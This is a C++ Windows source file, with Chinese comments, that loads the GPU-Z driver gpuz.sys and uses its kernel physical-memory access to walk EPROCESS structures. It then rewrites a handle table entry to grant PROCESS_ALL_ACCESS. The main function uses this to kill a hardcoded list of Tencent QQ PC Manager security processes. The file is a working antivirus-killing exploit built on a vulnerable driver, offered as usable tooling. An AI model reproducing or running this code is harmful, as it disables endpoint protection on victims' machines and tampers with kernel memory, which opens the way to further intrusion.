#include"Global.h"
#include <TlHelp32.h>
#define GPUZ_PATH "C:\\gpuz.sys"
sys* System = nullptr;
struct ProcessContext
{
	DWORD pid;
	DWORD64 dir_base;
	DWORD64 kernel_entry;
};
typedef struct _HANDLE_TABLE
{
	CHAR fill[100];
} HANDLE_TABLE, * PHANDLE_TABLE;
typedef struct _HANDLE_TABLE_ENTRY
{
	ULONGLONG Value;
	ULONGLONG GrantedAccess : 25;
} HANDLE_TABLE_ENTRY, * PHANDLE_TABLE_ENTRY;
extern "C" LPVOID SupGetKernelBase(
	_Out_opt_ PSIZE_T KernelSize
)
{
	NTSTATUS status;
	PVOID buffer;
	ULONG bufferSize = 2048;
	buffer = malloc(bufferSize);
	status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)11,
		buffer,
		bufferSize,
		&bufferSize
	);

	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		free(buffer);
		buffer = malloc(bufferSize);

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)11,
			buffer,
			bufferSize,
			&bufferSize
		);
	}
	if (!NT_SUCCESS(status))
		return NULL;

	if (KernelSize)
		*KernelSize = (SIZE_T)((PRTL_PROCESS_MODULES)buffer)->Modules[0].ImageSize;

	return ((PRTL_PROCESS_MODULES)buffer)->Modules[0].ImageBase;
}
DWORD64* GetKernelFunction(const char* name)
{
	static HMODULE ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
	static ULONG64 krnl_base = (ULONG64)SupGetKernelBase(nullptr);

	if (!krnl_base)
		throw std::runtime_error{ "Could not find the system base." };

	if (!ntoskrnl)
		throw std::runtime_error{ "Failed to load ntoskrnl.exe" };

	auto fn = (std::uint64_t)GetProcAddress(ntoskrnl, name);

	if (!fn) return nullptr;

	return (DWORD64*)(fn - (std::uint64_t)ntoskrnl + krnl_base);
}

ProcessContext GetProcessInfo(DWORD pid)
{
	ProcessContext info;
	info.pid = 0;
	//这部分抄了国外大神的,国外大神思路是
	// 1. 得到 PsInitialSystemProcess;
	// 2. 遍历 _EPROCESS 寻找到目标进程
	// 3. 读handletable
	auto addr_psinitialsystemprocess = GetKernelFunction("PsInitialSystemProcess");
	auto ntos_entry = System->Driver->ReadSystemAddress<std::uint64_t>(addr_psinitialsystemprocess);

	auto list_head = ntos_entry + 0x188; //Win7下 process_links 是0x188
	auto last_link = System->Driver->ReadSystemAddress<std::uint64_t>(list_head + sizeof(PVOID));
	auto cur_link = list_head;
	//遍历ERPOCESS
	do {
		auto entry = (std::uint64_t)cur_link - 0x188; //process_links win7下是0x188
		auto unique_pid = System->Driver->ReadSystemAddress<std::uint64_t>(entry + 0x180); //WIN7下的process_id是0x180
		if (unique_pid == pid) {
			info.pid = pid;
			info.dir_base = System->Driver->ReadSystemAddress<std::uint64_t>(entry + 0x028); //directorytable在win7是0x028
			info.kernel_entry = entry;
			break;
		}
		cur_link = System->Driver->ReadSystemAddress<std::uint64_t>(cur_link);
	} while (cur_link != last_link);
	return info;
}

bool ReadByDirbase(ProcessContext cur_context,PVOID base, PVOID buf, size_t len)
{
	auto phys = System->Driver->TranslateVirtualAddress(cur_context.dir_base, base);
	if (!phys)
		return false;
	return System->Driver->ReadPhysicalAddress(phys, buf, len);
}

bool WriteByDirBase(ProcessContext cur_context, PVOID base, PVOID buf, size_t len)
{
	auto phys = System->Driver->TranslateVirtualAddress(cur_context.dir_base, base);
	if (!phys)
		return false;
	return System->Driver->WritePhysicalAddress(phys, buf, len);
}
template<typename T, typename U>
T read(U base, ProcessContext cur_context)
{
	T temp = T{};
	ReadByDirbase(cur_context,(PVOID)base, &temp, sizeof(T));
	return temp;
}
template<typename T, typename U>
bool write(U base, T value, ProcessContext cur_context)
{
	return WriteByDirBase(cur_context,(PVOID)base, &value, sizeof(T));
}
//这一段是IDA里面看WIN7的ExpLookupHandleTableEntry函数修改而来的
PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntryWin7(PHANDLE_TABLE HandleTable, ULONGLONG Handle, ProcessContext cur_context)
{
	ULONGLONG v2;     // r8@2
	ULONGLONG v3;     // rcx@2
	ULONGLONG v4;     // r8@2
	ULONGLONG result; // rax@4
	ULONGLONG v6;     // [sp+8h] [bp+8h]@1
	ULONGLONG table = (ULONGLONG)HandleTable;

	v6 = Handle;
	v6 = Handle & 0xFFFFFFFC;
	if (v6 >= *(DWORD*)(table + 92)) {
		result = 0i64;
	}
	else {
		v2 = (*(ULONGLONG*)table);
		v3 = (*(ULONGLONG*)table) & 3i64;
		v4 = v2 - (ULONG)v3;
		if ((ULONG)v3) {
			if ((DWORD)v3 == 1)
				result = read<ULONGLONG>((((Handle - (Handle & 0x3FF)) >> 7) + v4), cur_context) + 4 * (Handle & 0x3FF);
			else
				result = read<ULONGLONG>((PVOID)(read<ULONGLONG>((PVOID)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4), cur_context) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)), cur_context) + 4 * (Handle & 0x3FF);
		}
		else {
			result = v4 + 4 * Handle;
		}
	}
	return (PHANDLE_TABLE_ENTRY)result;
}
bool ChangeHandleAccess(ProcessContext cur_context,HANDLE handle, ACCESS_MASK access_rights)
{
	auto handletable_address = read<PHANDLE_TABLE>(PVOID(cur_context.kernel_entry + 0x200), cur_context); //win7下handletable是0x200
	auto handle_table = read<HANDLE_TABLE>(handletable_address, cur_context);
	auto entry_addr = ExpLookupHandleTableEntryWin7(&handle_table, (ULONGLONG)handle, cur_context);
	if (!entry_addr)
		return false;
	//一切搞定后,就修改权限即可
	auto entry = read<HANDLE_TABLE_ENTRY>(entry_addr, cur_context);
	entry.GrantedAccess = access_rights;
	return write<HANDLE_TABLE_ENTRY>(entry_addr, entry, cur_context);
}
DWORD ProcessName2Pid(std::string ProcessName)
{
	DWORD FoundPID = -1;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::cout << "CreateToolhelp32Snapshot Error!" << std::endl;;
		return false;
	}
	bool bResult = Process32First(hProcessSnap, &pe32);
	while (bResult)
	{
		if (strcmp(pe32.szExeFile, ProcessName.c_str()) == 0)
		{
			printf("ProcessName: %s \n", ProcessName.c_str());
			FoundPID = pe32.th32ProcessID;
			break;
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return FoundPID;
}
void FuckupProcess(ProcessContext m_processinfo ,std::string ProcessName)
{
	DWORD pid = ProcessName2Pid(ProcessName);
	if (!pid || pid == -1)
		return;
	auto hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	ChangeHandleAccess(m_processinfo, hProcess, PROCESS_ALL_ACCESS);
	TerminateProcess(hProcess,0);
}
int main(int argc, char* argv[])
{
	OSVERSIONINFO osver;
	osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	std::string ServiceRegKey;
	auto& utils = Utils::instance();
	if (!utils.EnablePrivilege("SeLoadDriverPrivilege"))		// Enable 'SeLoadDriverPrivilege' For This Process To Load Drivers
		throw std::runtime_error("Could Not Set 'SeLoadDriverPrivilege'.");
	if (!utils.RegisterService(std::string(GPUZ_PATH), &ServiceRegKey))
	{
		printf("Could Not Register gpuz.sys.");
		getchar();
		return -1;
	}
	NTSTATUS Status = utils.UnloadDriver(ServiceRegKey);
	Status = utils.LoadDriver(ServiceRegKey);
	/* Check if It is Not A Success, But if Status == STATUS_OBJECT_NAME_COLLISION. Then It Means That It Is Already Running */
	if (!NT_SUCCESS(Status) && Status != STATUS_OBJECT_NAME_COLLISION)		// If it is already running, dont error handle.
	{
		printf("gpuz.sys Could Not Be Started.%d",GetLastError());
		getchar();
		return -1;
	}
	printf("gpuz.sys running successfully!\n");

	GetVersionExA(&osver);			// Get BuildNumber For The OS
	
	System = new sys(osver.dwBuildNumber);
	ProcessContext m_processinfo = GetProcessInfo(GetCurrentProcessId());
	std::string process_list[] = { "QMDL.exe","QMPersonalCenter.exe","QQPCPatch.exe" ,"QQPCRealTimeSpeedup.exe","QQPCRTP.exe","QQPCRTP.exe","QQPCTray.exe","QQPCTray.exe","QQRepair.exe" };
	for (auto iter : process_list)
	{
		FuckupProcess(m_processinfo, iter);
	}
	
	System->~sys();
	

	getchar();
	return 0;
}